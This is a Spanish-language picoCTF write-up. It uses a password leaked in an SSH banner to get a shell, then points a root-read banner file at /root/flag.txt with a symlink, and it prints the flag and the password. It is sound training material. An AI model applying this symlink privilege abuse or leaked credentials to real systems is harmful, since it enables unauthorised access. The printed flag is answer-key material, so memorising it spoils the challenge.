### Descripción
Can you abuse the banner?The server has been leaking some crucial information on `tethys.picoctf.net 57800`. Use the leaked information to get to the server.To connect to the running application use `nc tethys.picoctf.net 57205`. From the above information abuse the machine and find the flag in the /root directory.

Hints:
1. Do you know about symlinks?
2. Maybe some small password cracking or guessing

### Solución
Entramos a los servidores indicados, el primero para observar la contraseña y el segundo para introducir algunos datos y ver si nos dan la bandera:

```
┌──(kali㉿kali)-[~/picoCTF/parcial1/dontyoulovebanners]
└─$ nc tethys.picoctf.net 57800
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
^C
                                                                                              
┌──(kali㉿kali)-[~/picoCTF/parcial1/dontyoulovebanners]
└─$ nc tethys.picoctf.net 57205
*************************************
*************WELCOME***************
*************************************

what is the password? 
My_Passw@rd_@1234
What is the top cyber security conference in the world?
DEFCON 
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper
```

Por el momento no muestra la bandera:
```
player@challenge:~$ ls -la
ls -la
total 20
drwxr-xr-x 1 player player   20 Mar  9  2024 .
drwxr-xr-x 1 root   root     20 Mar  9  2024 ..
-rw-r--r-- 1 player player  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 player player 3771 Apr  4  2018 .bashrc
-rw-r--r-- 1 player player  807 Apr  4  2018 .profile
-rw-r--r-- 1 player player  114 Feb  7  2024 banner
-rw-r--r-- 1 root   root     13 Feb  7  2024 text
player@challenge:~$ cat banne
cat banner 
*************************************
*************WELCOME***************
*************************************
player@challenge:~$ cat banner
cat banner
*************************************
*************WELCOME***************
*************************************
player@challenge:~$  cat text
 cat text
keep digging
player@challenge:~$ ls -la /root
ls -la /root
total 16
drwxr-xr-x 1 root root    6 Mar 12  2024 .
drwxr-xr-x 1 root root   29 Apr 16 00:03 ..
-rw-r--r-- 1 root root 3106 Apr  9  2018 .bashrc
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
-rwx------ 1 root root   46 Mar 12  2024 flag.txt
-rw-r--r-- 1 root root 1317 Feb  7  2024 script.py
player@challenge:~$ cat flag.txt
cat flag.txt
cat: flag.txt: No such file or directory
```

No es posible hacer un cat al a bandera.
Observamos el script:
```
player@challenge:~$ cat /root/script.py
cat /root/script.py

import os
import pty

incorrect_ans_reply = "Lol, good try, try again and good luck\n"

if _name_ == "_main_":
    try:
      with open("/home/player/banner", "r") as f:
        print(f.read())
    except:
      print("*")
      print("DEFAULT BANNER*")
      print("Please supply banner in /home/player/banner")
      print("*")

try:
    request = input("what is the password? \n").upper()
    while request:
        if request == 'MY_PASSW@RD_@1234':
            text = input("What is the top cyber security conference in the world?\n").upper()
            if text == 'DEFCON' or text == 'DEF CON':
                output = input(
                    "the first hacker ever was known for phreaking(making free phone calls), who was it?\n").upper()
                if output == 'JOHN DRAPER' or output == 'JOHN THOMAS DRAPER' or output == 'JOHN' or output== 'DRAPER':
                    scmd = 'su - player'
                    pty.spawn(scmd.split(' '))

                else:
                    print(incorrect_ans_reply)
            else:
                print(incorrect_ans_reply)
        else:
            print(incorrect_ans_reply)
            break

except:
    KeyboardInterrupt
```

Borramos el archivo banner:

```
player@challenge:~$ rm /home/player/banner
rm /home/player/banner
```

Esto para crear un enlace que el banner apunte a la bandera:
```
player@challenge:~$ ln -s /root/flag.txt /home/player/banner
ln -s /root/flag.txt /home/player/banner
```

Ahora si se nos muestra la bandera:
```
┌──(kali㉿kali)-[~/picoCTF/parcial1/dontyoulovebanners]
└─$ nc tethys.picoctf.net 57205
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_218ef5d6}

what is the password?
```

Esto se hace ya que no nos permitía acceder a la bandera de otra forma, por lo que se hizo de esta manera

Flag:
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_218ef5d6}
### Notas adicionales

### Referencias
